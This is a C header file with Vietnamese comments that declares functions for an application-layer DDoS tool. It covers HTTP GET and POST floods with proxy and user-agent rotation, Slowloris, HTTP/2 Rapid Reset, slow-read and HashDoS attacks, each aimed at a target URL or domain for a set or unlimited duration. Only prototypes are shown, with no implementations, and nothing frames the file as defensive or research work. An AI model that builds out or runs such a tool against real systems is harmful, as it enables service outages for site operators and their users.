/**
 * ddos_layer7.h
 * Khai bao prototype cho cac ham DDoS tang ung dung (Layer 7)
 */

#ifndef DDOS_LAYER7_H
#define DDOS_LAYER7_H

#include <stddef.h>

/**
 * HTTP GET Flood
 * Gui nhieu GET request den URL muc tieu
 * Dau vao: url - URL muc tieu (vi du: https://example.com/page)
 *          so_thread - so luong thread chay song song
 *          thoi_gian - thoi gian tan cong (giay), 0 = vo han
 *          danh_sach_user_agent - danh sach user agent, NULL = mac dinh
 *          dung_proxy - 1 neu su dung proxy, 0 neu khong
 * Tra ve: so request da gui
 */
int http_get_flood(const char* url, int so_thread, int thoi_gian,
                   const char** danh_sach_user_agent, int dung_proxy);

/**
 * HTTP POST Flood
 * Gui nhieu POST request den URL muc tieu
 * Dau vao: url - URL muc tieu
 *          body - noi dung POST body
 *          so_thread - so luong thread
 *          thoi_gian - thoi gian tan cong (giay)
 * Tra ve: so request da gui
 */
int http_post_flood(const char* url, const char* body, int so_thread, int thoi_gian);

/**
 * Slowloris Attack
 * Mo nhieu ket noi va gui header cham de giam sat server
 * Dau vao: muc_tieu - dia chi muc tieu
 *          cong - cong muc tieu (thuong la 80 hoac 443)
 *          so_socket - so luong ket noi toi da
 *          thoi_gian - thoi gian duy tri tan cong (giay)
 * Tra ve: so ket noi dang mo
 */
int slowloris_attack(const char* muc_tieu, int cong, int so_socket, int thoi_gian);

/**
 * HTTP/2 Rapid Reset Attack
 * Gui nhieu stream va reset lien tuc de gay qua tai server
 * Dau vao: muc_tieu - domain muc tieu
 *          so_thread - so luong thread
 *          thoi_gian - thoi gian tan cong (giay)
 * Tra ve: so stream da gui
 */
int http2_rst_attack(const char* muc_tieu, int so_thread, int thoi_gian);

/**
 * Slow Read Attack
 * Doc phan hoi cua server that cham de giam sat ket noi
 * Dau vao: url - URL muc tieu
 *          so_thread - so luong thread
 *          thoi_gian - thoi gian (giay)
 * Tra ve: so ket noi dang mo
 */
int slow_read_attack(const char* url, int so_thread, int thoi_gian);

/**
 * HashDoS / Recursive Hash Collision
 * Gui request voi tham so dac biet gay ton CPU server
 * Dau vao: url - URL muc tieu
 *          so_thread - so luong thread
 *          thoi_gian - thoi gian (giay)
 * Tra ve: so request da gui
 */
int hash_dos_attack(const char* url, int so_thread, int thoi_gian);

#endif /* DDOS_LAYER7_H */